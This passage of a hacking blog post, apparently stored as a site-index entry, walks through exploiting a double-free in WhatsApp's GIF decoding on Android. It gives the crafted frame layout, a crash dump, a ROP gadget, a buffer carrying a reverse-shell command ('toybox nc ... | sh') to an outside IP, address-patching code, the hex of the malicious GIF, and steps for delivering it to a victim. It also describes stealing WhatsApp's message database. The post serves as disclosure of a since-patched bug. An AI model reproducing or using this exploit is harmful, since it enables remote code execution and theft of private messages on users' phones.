= reallocarray(info-&gt;rasterBits, 0x8*0x15, 1);                    Frame 2:                  info-&gt;rasterBits = reallocarray(info-&gt;rasterBits, 0x0*0xf1c, 1);                    Frame 3:                  info-&gt;rasterBits = reallocarray(info-&gt;rasterBits, 0x0*0xf1c, 1);                    Frame 4:                  does not matter, it is there to make this GIF file valid                      Second parse:          Init:                  GifInfo *info = malloc(168);                    Frame 1:                  info-&gt;rasterBits = reallocarray(info-&gt;rasterBits, 0x8*0x15, 1);                    Frame 2, 3, 4:                  does not matter                    End:                  info-&gt;rewindFunction(info);                    Because of the double-free bug occuring in the first parse, info and info-&gt;rasterBits now points to the same location. With the first frame crafted as said, we could control rewindFunction and PC when info-&gt;rewindFunction(info); is called.Take note that the frames are all LZW encoded. We must use an LZW encoder to encode the frames. The above GIF triggers crash as below: --------- beginning of crash10-02 11:09:38.460 17928 18059 F libc    : Fatal signal 6 (SIGABRT), code -6 in tid 18059 (image-loader), pid 17928 (com.whatsapp)10-02 11:09:38.467  1027  1027 D QCOM PowerHAL: LAUNCH HINT: OFF10-02 11:09:38.494 18071 18071 I crash_dump64: obtaining output fd from tombstoned, type: kDebuggerdTombstone10-02 11:09:38.495  1127  1127 I /system/bin/tombstoned: received crash request for pid 1792810-02 11:09:38.497 18071 18071 I crash_dump64: performing dump of process 17928 (target tid = 18059)10-02 11:09:38.497 18071 18071 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***10-02 11:09:38.497 18071 18071 F DEBUG   : Build fingerprint: 'google/taimen/taimen:8.1.0/OPM1.171019.011/4448085:user/release-keys'10-02 11:09:38.497 18071 18071 F DEBUG   : Revision: 'rev_10'10-02 11:09:38.497 18071 18071 F DEBUG   : ABI: 'arm64'10-02 11:09:38.497 18071 18071 F DEBUG   : pid: 17928, tid: 18059, name: image-loader  &gt;&gt;&gt; com.whatsapp &lt;&lt;&lt;10-02 11:09:38.497 18071 18071 F DEBUG   : signal 6 (SIGABRT), code -6 (SI_TKILL), fault addr --------10-02 11:09:38.497 18071 18071 F DEBUG   :     x0   0000000000000000  x1   000000000000468b  x2   0000000000000006  x3   000000000000000810-02 11:09:38.497 18071 18071 F DEBUG   :     x4   0000000000000000  x5   0000000000000000  x6   0000000000000000  x7   7f7f7f7f7f7f7f7f10-02 11:09:38.497 18071 18071 F DEBUG   :     x8   0000000000000083  x9   0000000010000000  x10  0000007da3c81cc0  x11  000000000000000110-02 11:09:38.497 18071 18071 F DEBUG   :     x12  0000007da3c81be8  x13  ffffffffffffffff  x14  ff00000000000000  x15  ffffffffffffffff10-02 11:09:38.497 18071 18071 F DEBUG   :     x16  00000055b111efa8  x17  0000007e2bb3452c  x18  0000007d8ba9bad8  x19  000000000000460810-02 11:09:38.497 18071 18071 F DEBUG   :     x20  000000000000468b  x21  0000000000000083  x22  0000007da3c81e48  x23  00000055b111f3f010-02 11:09:38.497 18071 18071 F DEBUG   :     x24  0000000000000040  x25  0000007d8bbff588  x26  00000055b1120670  x27  000000000000000b10-02 11:09:38.497 18071 18071 F DEBUG   :     x28  00000055b111f010  x29  0000007da3c81d00  x30  0000007e2bae976010-02 11:09:38.497 18071 18071 F DEBUG   :     sp   0000007da3c81cc0  pc   0000007e2bae9788  pstate 000000006000000010-02 11:09:38.499 18071 18071 F DEBUG   :10-02 11:09:38.499 18071 18071 F DEBUG   : backtrace:10-02 11:09:38.499 18071 18071 F DEBUG   :     #00 pc 000000000001d788  /system/lib64/libc.so (abort+120)10-02 11:09:38.499 18071 18071 F DEBUG   :     #01 pc 0000000000002fac  /system/bin/app_process64 (art::SignalChain::Handler(int, siginfo*, void*)+1012)10-02 11:09:38.499 18071 18071 F DEBUG   :     #02 pc 00000000000004ec  [vdso:0000007e2e4b0000]10-02 11:09:38.499 18071 18071 F DEBUG   :     #03 pc deadbeeefffffffc  &lt;unknown&gt;Deal with ASLR and W^X After controlling the PC, we want to achieve remote code execution. In Android, we can not execute code on non-executable regions due to W^X (i.e. stack and heap). The easiest way to deal with W^X in our case is to execute the below command: system(\"toybox nc 192.168.2.72 4444 | sh\");For that, we need PC to point to system() function in libc.so and X0 to point to \"toybox nc 192.168.2.72 4444 | sh\".This cannot be done directly. We need to first let PC jumps to an intermediate gadget, which sets X0 to point to \"toybox nc 192.168.2.72 4444 | sh\" and jump to system().From the disassembly code around info-&gt;rewindFunction(info);, we can see that both X0 and X19 point to info-&gt;rasterBits (or info, because they both point to the same location), while X8 is actually info-&gt;rewindFunction.  There is a gadget in libhwui.so that perfectly satisfies our purpose: ldr x8, [x19, #0x18]add x0, x19, #0x20blr x8Let say the address of the above gadget is AAAAAAAA and the address of system() function is BBBBBBBB. The rasterBits buffer (frame 1) before LZW encoding look as below: 00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................00000010: 0000 0000 0000 0000 4242 4242 4242 4242  ........BBBBBBBB00000020: 746f 7962 6f78 206e 6320 3139 322e 3136  toybox nc 192.1600000030: 382e 322e 3732 2034 3434 3420 7c20 7368  8.2.72 4444 | sh00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................00000080: 4141 4141 4141 4141 eeff                 AAAAAAAA..In a normal Android system, because every processes are spawned from Zygotes, even with ASLR our addresses AAAAAAAA and BBBBBBBB do not change if WhatsApp is killed and restarted. However, they cannot persist a system reboot. To have reliable AAAAAAAA and BBBBBBBB, we need an information disclosure vulnerability that gives us the base address of libc.so and libhwui.so. That vulnerability is beyond scope of this blogpost. Putting everything together Just compile the code in this repo. Note that the address of system() and the gadget must be replaced by the actual address found by an information disclosure vulnerability (which is not covered in this blog post).     /*    Gadget g1:        ldr x8, [x19, #0x18]        add x0, x19, #0x20        blr x8    */    size_t g1_loc = 0x7cb81f0954;  &lt;&lt;-- replace this    memcpy(buffer + 128, &amp;g1_loc, 8);    size_t system_loc = 0x7cb602ce84; &lt;&lt;-- replace this    memcpy(buffer + 24, &amp;system_loc, 8);Run the code to generate the corrupted GIF file: notroot@osboxes:~/Desktop/gif$ make...............notroot@osboxes:~/Desktop/gif$ ./exploitbuffer = 0x7ffc586cd8b0 size = 26647 49 46 38 39 61 18 00 0A 00 F2 00 00 66 CC CCFF FF FF 00 00 00 33 99 66 99 FF CC 00 00 00 0000 00 00 00 00 2C 00 00 00 00 08 00 15 00 00 089C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 84 9C 09 B0C5 07 00 00 00 74 DE E4 11 F3 06 0F 08 37 63 40C4 C8 21 C3 45 0C 1B 38 5C C8 70 71 43 06 08 1A34 68 D0 00 C1 07 C4 1C 34 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 54 12 7C C0 C5 07 00 00 00 EE FF FF 2C 00 0000 00 1C 0F 00 00 00 00 2C 00 00 00 00 1C 0F 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 2C 00 00 00 0018 00 0A 00 0F 00 01 00 00 3BThen copy the content into a GIF file and send it as Document with WhatsApp to another WhatsApp user. Take note that it must not be sent as a Media file, otherwise WhatsApp tries to convert it into an MP4 before sending.Upon the user receives the malicous GIF file, nothing will happen until the user open WhatsApp Gallery to send a media file to his/her friend. Affected versions The exploit works well until WhatsApp version 2.19.230. The vulnerability is official patched in WhatsApp version 2.19.244 The exploit works well for Android 8.1 and 9.0, but does not work for Android 8.0 and below. In the older Android versions, double-free could still be triggered. However, because of the malloc calls by the system after the double-free, the app just crashes before reaching to the point that we could control the PC register. Note that Facebook informed the developer of android-gif-drawable repo about the issue. The fix from Facebook was also merged into the original repo in a commit from August 10th. Version 1.2.18 of android-gif-drawable is safe from the double-free bug. Attack vectors With the above exploitation, we can have two attack vectors:   Local privilege escaltion (from a user app to WhatsApp): A malicious app is installed on the Android device. The app collects addresses of zygote libraries and generates a malicious GIF file that results in code execution in WhatsApp context. This allows the malware app to steal files in WhatsApp sandbox including message database.  Remote code execution: Pairing with an application that has an remote memory information disclosure vulnerability (e.g. browser), the attacker can collect the addresses of zygote libraries and craft a malicious GIF file to send it to the user via WhatsApp (must be as an attachment, not as an image through Gallery Picker). As soon as the user opens the Gallery view in WhatsApp (who never sends media files to friends, right?), the GIF file will trigger a remote shell in WhatsApp context.","categories": ["Hacking"],
        "tags": [],
        "url": "https://awakened1712.github.io/hacking/hacking-whatsapp-gif-rce/",
        "teaser":"https://awakened1712.github.io/assets/img/whatsapp.png"}]